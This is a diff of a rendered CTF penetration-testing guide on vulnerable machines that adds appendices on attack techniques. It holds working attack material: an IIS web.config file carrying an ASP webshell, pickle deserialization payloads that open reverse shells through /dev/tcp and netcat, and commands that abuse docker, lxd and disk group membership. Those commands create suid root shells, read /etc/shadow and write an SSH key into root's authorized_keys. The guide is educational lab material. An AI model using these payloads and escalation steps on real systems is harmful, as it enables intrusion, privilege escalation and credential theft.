+--execute=statement, -e statement : Execute the statement and quit. Disables --force and history file. The default output format is like that produced with --batch.
 </pre></div>
 </div>
 </li>
-</ul>
-<blockquote>
-<div><p>we may use</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>class Shell_code(object):
-def __reduce__(self):
-        return (os.system,(&#39;/bin/bash -i &gt;&amp; /dev/tcp/&quot;Client IP&quot;/&quot;Listening PORT&quot; 0&gt;&amp;1&#39;,))
-shell = cPickle.dumps(Shell_code())
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((&#39;Server IP&#39;,&#39;Server PORT&#39;))
-client_socket.send(shell)
-</pre></div>
-</div>
-<p>Refer <a class="reference external" href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely</a></p>
-</div></blockquote>
-<ul class="simple">
-<li>Handy Stuff</li>
+<li><p class="first">If there’s .action file present in the URL on a Apache WebServer, <a class="reference external" href="https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html">Apache Struts</a> might be installed on it. Check for Apache Struts vulnerabilities on it.</p>
+</li>
+<li><p class="first">Handy Stuff</p>
+</li>
 </ul>
 <blockquote>
 <div><ul class="simple">
@@ -3823,7 +3947,7 @@ exit 0
 <div class="section" id="knockd">
 <h3>Knockd<a class="headerlink" href="#knockd" title="Permalink to this headline">¶</a></h3>
 <p><a class="reference external" href="http://www.zeroflux.org/projects/knock">Knockd - Port-knocking server</a> : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
-<p>If there is port knocking involved, read the /etc/knockd.conf, read the sequence port know should be done and execute</p>
+<p>If there is port knocking involved, read the /etc/knockd.conf, read the sequence port knock should be done and execute</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
 </pre></div>
 </div>
@@ -4242,6 +4366,49 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 <p class="last">Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!</p>
 </div>
 </div>
+<div class="section" id="iis-web-config-upload">
+<h4>IIS - Web.config Upload<a class="headerlink" href="#iis-web-config-upload" title="Permalink to this headline">¶</a></h4>
+<p>If we are able to upload a web.config file by a file upload functionality in IIS - Windows machine, there might be a possibility of remote code execution.</p>
+<p>A web.config file lets you customize the way site or a specific directory on site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.</p>
+<p>With a web.config file, you can control:</p>
+<ul class="simple">
+<li>Database connection strings.</li>
+<li>Error behavior.</li>
+<li>Security.</li>
+</ul>
+<p>Refer <a class="reference external" href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">Upload a web.config File for Fun &amp; Profit</a> and <a class="reference external" href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">RCE by uploading a web.config</a></p>
+<p>We can upload the below web.config</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+  &lt;system.webServer&gt;
+     &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+        &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
+     &lt;/handlers&gt;
+     &lt;security&gt;
+        &lt;requestFiltering&gt;
+           &lt;fileExtensions&gt;
+              &lt;remove fileExtension=&quot;.config&quot; /&gt;
+           &lt;/fileExtensions&gt;
+           &lt;hiddenSegments&gt;
+              &lt;remove segment=&quot;web.config&quot; /&gt;
+           &lt;/hiddenSegments&gt;
+        &lt;/requestFiltering&gt;
+     &lt;/security&gt;
+  &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;%
+set cmd = Request.QueryString(&quot;cmd&quot;)
+Set os = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
+output = os.exec(&quot;cmd.exe /c &quot; + cmd).stdout.readall
+response.write output
+%&gt;
+</pre></div>
+</div>
+<p>The above expects a parameter cmd which is executed using wscript.shell and can be executed like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/uploads/web.config?cmd=whoami
+</pre></div>
+</div>
+</div>
 </div>
 </div>
 <div class="section" id="appendix-iii-transferring-files-from-linux-to-windows-post-exploitation">
@@ -4350,8 +4517,8 @@ ps.exe can be your meterpreter exe
 </div>
 </div>
 </div>
-<div class="section" id="id30">
-<h3>HTTP<a class="headerlink" href="#id30" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id34">
+<h3>HTTP<a class="headerlink" href="#id34" title="Permalink to this headline">¶</a></h3>
 <div class="section" id="setting-up-the-server">
 <h4>Setting up the Server<a class="headerlink" href="#setting-up-the-server" title="Permalink to this headline">¶</a></h4>
 <p>We can use python-SimpleHTTPServer to set up a HTTP Web Server</p>
@@ -4380,8 +4547,8 @@ ps.exe can be your meterpreter exe
 <div class="section" id="ftp">
 <h3>FTP<a class="headerlink" href="#ftp" title="Permalink to this headline">¶</a></h3>
 <p>We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.</p>
-<div class="section" id="id31">
-<h4>Setting up the Server<a class="headerlink" href="#id31" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id35">
+<h4>Setting up the Server<a class="headerlink" href="#id35" title="Permalink to this headline">¶</a></h4>
 <p>We can either use Python-pyftpdlib or Metasploit to create a FTP Server</p>
 <p><strong>Python-pyftpdlib</strong></p>
 <p>Install using apt</p>
@@ -4495,8 +4662,8 @@ echo &quot;anonymous&quot; &gt;&gt; commands.txt
 <div class="section" id="tftp">
 <h3>TFTP<a class="headerlink" href="#tftp" title="Permalink to this headline">¶</a></h3>
 <p>We can also utilize TFTP to download or upload files</p>
-<div class="section" id="id32">
-<h4>Setting up the Server<a class="headerlink" href="#id32" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id36">
+<h4>Setting up the Server<a class="headerlink" href="#id36" title="Permalink to this headline">¶</a></h4>
 <p>Metasploit module</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>use auxiliary/server/tftp
 msf auxiliary(server/tftp) &gt; info
@@ -4551,9 +4718,343 @@ msf auxiliary(server/tftp) &gt; run
 <div class="highlight-None"><div class="highlight"><pre><span></span>pkgmgr /iu:&quot;TFTP&quot;
 </pre></div>
 </div>
+</div>
+</div>
+</div>
+<div class="section" id="appendix-iv-linux-group-membership-issues">
+<span id="a4-linux-group-membership-issues"></span><h2>Appendix-IV Linux Group Membership Issues<a class="headerlink" href="#appendix-iv-linux-group-membership-issues" title="Permalink to this headline">¶</a></h2>
+<p>Let’s examine in what groups we are members. Recommended read about groups: <a class="reference external" href="https://wiki.archlinux.org/index.php/users_and_groups">Users and Groups</a> and <a class="reference external" href="https://wiki.debian.org/SystemGroups">System Groups</a></p>
+<div class="section" id="docker-group">
+<h3>Docker Group<a class="headerlink" href="#docker-group" title="Permalink to this headline">¶</a></h3>
+<p>Any user who is part of the docker group should also be considered root. Read <a class="reference external" href="http://reventlov.com/advisories/using-the-docker-command-to-root-the-host">Using the docker command to root the host</a> Older version of docker were vulnerable to Docker breakout. More details at <a class="reference external" href="https://github.com/gabrtv/shocker">Shocker / Docker Breakout PoC</a></p>
+<p>If you are the docker user and want to get root.</p>
+<div class="section" id="create-a-dockerfile">
+<h4>Create a Dockerfile<a class="headerlink" href="#create-a-dockerfile" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>mkdir docker-test
+cd docker-test
+
+cat &gt; Dockerfile
+FROM debian:wheezy
+ENV WORKDIR /stuff
+RUN mkdir -p $WORKDIR
+VOLUME [ $WORKDIR ]
+WORKDIR $WORKDIR
+</pre></div>
+</div>
+</div>
+<div class="section" id="build-the-docker">
+<h4>Build the Docker<a class="headerlink" href="#build-the-docker" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>docker build -t my-docker-image .
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">If there are already docker images present on the host machine, we can utilize those also instead of making a new one. If there are none, we can copy a image to the vulnerable machine.</p>
+</div>
+<p><strong>Copy docker images from one host to another without via repository?</strong></p>
+<p>Save the docker image as a tar file:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>docker save -o &lt;path for generated tar file&gt; &lt;image name&gt;
+</pre></div>
+</div>
+<p>Then copy the image to a new system with regular file transfer tools such as cp or scp. After that, load the image into docker:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>docker load -i &lt;path to image tar file&gt;
+</pre></div>
+</div>
+</div>
+<div class="section" id="become-root">
+<h4>Become root?<a class="headerlink" href="#become-root" title="Permalink to this headline">¶</a></h4>
+<ul class="simple">
+<li>Copy binaries from the container into the host and give them suid permissions:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c &#39;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#39;
+
+./sh
+whoami
+# root
+</pre></div>
+</div>
+<p>If the sh is not working, create a suid.c, compile it, suid it and run.</p>
+</div></blockquote>
+<ul class="simple">
+<li>Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &#39;cat shadow&#39;
+# root:!:16364:0:99999:7:::
+# daemon:*:16176:0:99999:7:::
+# bin:*:16176:0:99999:7:::
+# ...
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Bind the host’s / and overwrite system commands with rogue programs:</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v /:/stuff -t my-docker-image /bin/sh -c &#39;cp /stuff/rogue-program /stuff/bin/cat&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Privileged copy of bash for later access?</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v /:/stuff -t my-docker-image /bin/sh -c &#39;cp /stuff/bin/bash /stuff/bin/root-shell-ftw &amp;&amp; chmod a+s /stuff/bin/root-shell-ftw&#39;
+root-shell-ftw  -p
+root-shell-ftw-4.3#
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+</div>
+<div class="section" id="video">
+<h3>Video<a class="headerlink" href="#video" title="Permalink to this headline">¶</a></h3>
+<p>If the user is a part of the video group, he possibly might have access to the frame buffer (/dev/fb0) (which provides an abstraction for the video hardware), video capture devices, 2D/3D hardware acceleration. More details can be found at <a class="reference external" href="https://en.wikipedia.org/wiki/Linux_framebuffer">Linux Framebuffer</a> and <a class="reference external" href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">Kernel Framebuffer</a></p>
+<p>If, we have access to the framebuffer device /dev/fb0. We can use a tool like <a class="reference external" href="https://github.com/AndrewFromMelbourne/fb2png">fb2png</a> to convert it to a png picture or we can cat it and get a file:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cat /dev/fb0 &gt; screenshot.raw
+
+ls -l screenshot.raw
+-rw-rw-r-- 1 user user 4163040 May 18 03:52 screenshot.raw
+</pre></div>
+</div>
+<p>To find the screen resolution, we can read virtual size</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cat /sys/class/graphics/fb0/virtual_size
+1176,885
+</pre></div>
+</div>
+<p>We can then open the screenshot as a raw file (Select File Type: Raw Image Data) in Gimp, enter the width and height as well of the color arrangement, RGB, RGBA etc.</p>
+</div>
+<div class="section" id="disk">
+<h3>Disk<a class="headerlink" href="#disk" title="Permalink to this headline">¶</a></h3>
+<p>Debian’s wiki says about the “disk” group: Raw access to disks. Mostly equivalent to root access. The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.</p>
+<p>We can use debugfs command to read everything and dd command to write anywhere.</p>
+<p>Read /root/.ssh/authorized_keys using debugfs:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs -w /dev/sda1 -R &quot;cat /root/.ssh/authorized_keys&quot;
+debugfs 1.42.13 (17-May-2015)
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+</pre></div>
+</div>
+<p>Let’s find the block where the “/root/.ssh/authorized_keys” file resides:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs /dev/sda1 -R &quot;blocks /root/.ssh/authorized_keys&quot;
+debugfs 1.42.13 (17-May-2015)
+1608806
+</pre></div>
+</div>
+<p>Let’s use dd to write our own public key inside /root/.ssh/authorized_keys. This command will write over (i.e. it will replace) the old data:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>user@hostname:/tmp$ dd if=/tmp/id_rsa.pub of=/dev/sda1 seek=1608806 bs=4096 count=1
+0+1 records in
+0+1 records out
+394 bytes copied, 0.00239741 s, 164 kB/s
+</pre></div>
+</div>
+<p>It’s important to sync afterwards:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>user@hostname:/tmp$ sync
+</pre></div>
+</div>
+<p>Read again to check if the file was overwritten</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs -w /dev/sda1 -R &quot;cat /root/.ssh/authorized_keys&quot;
+debugfs 1.42.13 (17-May-2015)
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+</pre></div>
+</div>
+<p>More usage details about can be found at <a class="reference external" href="https://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html">debugfs Command Examples</a></p>
+<div class="section" id="set-file-system">
+<h4>Set file system<a class="headerlink" href="#set-file-system" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&gt; debugfs /dev/hda6
+debugfs 1.19, 13-Jul-2000 for EXT2 FS 0.5b, 95/08/09
+</pre></div>
+</div>
+</div>
+<div class="section" id="list-files">
+<h4>List files<a class="headerlink" href="#list-files" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>debugfs:  ls
+2790777 (12) .   32641 (12) ..   2790778 (12) dir1   2790781 (16) file1
+2790782 (4044) file2
+</pre></div>
+</div>
+</div>
+<div class="section" id="list-the-files-with-a-long-listing">
+<h4>List the files with a long listing<a class="headerlink" href="#list-the-files-with-a-long-listing" title="Permalink to this headline">¶</a></h4>
+<p>Format is:</p>
+<ul class="simple">
+<li>Field 1:  Inode number.</li>
+<li>Field 2:  First one or two digits is the type of node:</li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li>2 = Character device</li>
+<li>4 = Directory</li>
+<li>6 = Block device</li>
+<li>10 = Regular file</li>
+<li>12 = Symbolic link</li>
+<li>The Last four digits are the Linux permissions</li>
+</ul>
+</div></blockquote>
+<ul class="simple">
+<li>Field 3: Owner uid</li>
+<li>Field 4: Group gid</li>
+<li>Field 5: Size in bytes.</li>
+<li>Field 6: Date</li>
+<li>Field 7: Time of last creation.</li>
+<li>Field 8: Filename.</li>
+</ul>
+<div class="highlight-None"><div class="highlight"><pre><span></span>debugfs:  ls -l
+2790777  40700   2605   2601    4096  5-Nov-2001 15:30 .
+ 32641   40755   2605   2601    4096  5-Nov-2001 14:25 ..
+2790778  40700   2605   2601    4096  5-Nov-2001 12:43 dir1
+2790781 100600   2605   2601      14  5-Nov-2001 15:29 file1
+2790782 100600   2605   2601      14  5-Nov-2001 15:30 file2
+</pre></div>
+</div>
+</div>
+<div class="section" id="dump-the-contents-of-file1">
+<h4>Dump the contents of file1<a class="headerlink" href="#dump-the-contents-of-file1" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>debugfs: cat file1
+This is file1
+</pre></div>
+</div>
+</div>
+<div class="section" id="dump-an-inode-to-a-file">
+<h4>Dump an inode to a file<a class="headerlink" href="#dump-an-inode-to-a-file" title="Permalink to this headline">¶</a></h4>
+<p>Same as cat, but to a file and using inode number instead of the file name.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>debugfs: dump &lt;2790782&gt; file1-debugfs
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="lxd">
+<h3>LXD<a class="headerlink" href="#lxd" title="Permalink to this headline">¶</a></h3>
+<p>The below has been taken from <a class="reference external" href="https://reboare.github.io/lxd/lxd-escape.html">LXD-Escape</a></p>
+<p>LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. The lxd group should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group.</p>
+<div class="section" id="exploiting">
+<h4>Exploiting<a class="headerlink" href="#exploiting" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true
+Creating test
+
+ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
+Device whatever added to test
+
+ubuntu@ubuntu:~$ lxc start test
+ubuntu@ubuntu:~$ lxc exec test bash
+</pre></div>
+</div>
+<p>Here we have created an lxc container, assigned it security privileges and mounted the full disk under /mnt/root</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lxc exec test bash
+root@test:~# cd /mnt/root
+root@test:/mnt/root# ls
+bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var
+boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+
+root@test:/mnt/root# cd root
+root@test:/mnt/root/root# ls
+root@test:/mnt/root/root# touch ICanDoWhatever
+root@test:/mnt/root/root# exit
+exit
+</pre></div>
+</div>
+<p>At this point, we can write a ssh public key to the root/.ssh folder and use that to access the machine.</p>
+</div>
+</div>
+</div>
+<div class="section" id="appendix-v-coding-languages-tricks">
+<span id="a5-coding-languages-tricks"></span><h2>Appendix-V Coding Languages Tricks<a class="headerlink" href="#appendix-v-coding-languages-tricks" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="id37">
+<h3>Python<a class="headerlink" href="#id37" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="pickle">
+<h4>Pickle<a class="headerlink" href="#pickle" title="Permalink to this headline">¶</a></h4>
+<p>If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cPickle.loads(data)
+</pre></div>
+</div>
+<p>The pickle website say <em>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</em></p>
+<p>we may use</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>class Shell_code(object):
+def __reduce__(self):
+        return (os.system,(&#39;/bin/bash -i &gt;&amp; /dev/tcp/&quot;Client IP&quot;/&quot;Listening PORT&quot; 0&gt;&amp;1&#39;,))
+   or   return (os.system,(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.XX 4444 &gt;/tmp/f&#39;,))
+shell = cPickle.dumps(Shell_code())
+</pre></div>
+</div>
+<p>if we print shell variable above, it would look something like below if python version 2 is used</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cposix
+system
+p1
+(S&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.XX 4444 &gt;/tmp/f&#39;
+p2
+tp3
+Rp4
+.
+</pre></div>
+</div>
+<p>and in python version 3</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>b&#39;\x80\x03cposix\nsystem\nq\x00XT\x00\x00\x00/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.26 4444 &gt;/tmp/fq\x01\x85q\x02Rq\x03.&#39;
+</pre></div>
+</div>
+<p>Pickle is imported in python 3 as</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>import _pickle as cPickle
+</pre></div>
+</div>
+<p>and in python 2</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>import cPickle
+</pre></div>
+</div>
+<p>Now, we can test locally that our code for shell is working by unpickling by</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>#data.txt containing our Pickled data
+import cPickle
+path = &quot;/tmp/data.txt&quot;
+data = open(path, &quot;rb&quot;).read()
+item = cPickle.loads(data)
+</pre></div>
+</div>
+<p>Refer <a class="reference external" href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely</a> , <a class="reference external" href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">Sour Pickles</a> and <a class="reference external" href="https://blog.nelhage.com/2011/03/exploiting-pickle/">Exploiting misuse of Python’s “pickle”</a></p>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.</p>
+</div>
+</div>
+</div>
+<div class="section" id="id38">
+<h3>PHP<a class="headerlink" href="#id38" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="preg-replace">
+<h4>Preg_Replace<a class="headerlink" href="#preg-replace" title="Permalink to this headline">¶</a></h4>
+<p>PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a> and <a class="reference external" href="http://www.madirish.net/402">Exploiting PHP PCRE Functions</a> Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.</p>
+</div>
+<div class="section" id="complex-curly-syntax">
+<h4>Complex Curly Syntax<a class="headerlink" href="#complex-curly-syntax" title="Permalink to this headline">¶</a></h4>
+<p>PHP has <a class="reference external" href="http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a> The Complex Syntax to allow evaluation of our own code in double quotes.</p>
+<p>Example</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>$use_me = &quot;ls -lah&quot;
+{${system($use_me)}}
+</pre></div>
+</div>
+<p>This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).</p>
+</div>
+<div class="section" id="xdebug">
+<h4>Xdebug<a class="headerlink" href="#xdebug" title="Permalink to this headline">¶</a></h4>
+<p>If you find uncommon headers such as xdebug in the response, it might be possible to get a reverse shell. Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code execution is possible via injections that exist in eval or property_set xdebug commands. Refer <a class="reference external" href="https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/">xpwn - exploiting xdebug enabled servers</a>  and <a class="reference external" href="https://github.com/gteissier/xdebug-shell">xdebug-shell</a></p>
+</div>
+<div class="section" id="type-juggling-magic-bytes">
+<h4>Type Juggling/ Magic Bytes<a class="headerlink" href="#type-juggling-magic-bytes" title="Permalink to this headline">¶</a></h4>
+<p>Type juggling in PHP is caused by an issue of loose operations versus strict operations. Strict comparisons will compare both the data values and the types associated to them. A loose comparison will use context to understand what type the data is. According to PHP documentation for comparison operations at <a class="reference external" href="http://php.net/manual/en/language.operators.comparison.php">Language Operators Comparison</a></p>
+<p><em>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. These rules also apply to the switch statement. The type conversion does not take place when the comparison is === or !== as this involves comparing the type as well as the value.</em></p>
+<p>So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.</p>
+<p>Refer <a class="reference external" href="https://www.whitehatsec.com/blog/magic-hashes/">Magic Hashes</a>, <a class="reference external" href="https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#">PHP Weak Typing Woes; With Some Pontification about Code and Pen Testing</a> and <a class="reference external" href="http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Writing Exploits For Exotic Bug Classes:
+PHP Type Juggling</a></p>
+</div>
+</div>
+<div class="section" id="id40">
+<h3>LUA<a class="headerlink" href="#id40" title="Permalink to this headline">¶</a></h3>
+<p>In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is <a class="reference external" href="http://seclists.org/fulldisclosure/2014/May/128">Lua Web Application Security Vulnerabilities</a></p>
+</div>
+</div>
+<div class="section" id="changelog">
+<h2>Changelog<a class="headerlink" href="#changelog" title="Permalink to this headline">¶</a></h2>
+<ul>
+<li><strong class="first">Added two new Appendix - Linux Group Memberships and Coding Languages Tricks, IIS Web.config Upload RCE, Wget long filename shorten</strong><span> by </span><em>bitvijays</em><span> at </span><em>2018-06-29 03:55:14</em></li>
+<li><strong class="first">Merge branch ‘master’ into master</strong><span> by </span><em>Vijay Kumar</em><span> at </span><em>2018-06-29 03:38:53</em></li>
+</ul>
 <div data-disqus-identifier="CTF Series : Vulnerable Machines" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
-</div>
-</div>
 </div>
 
 
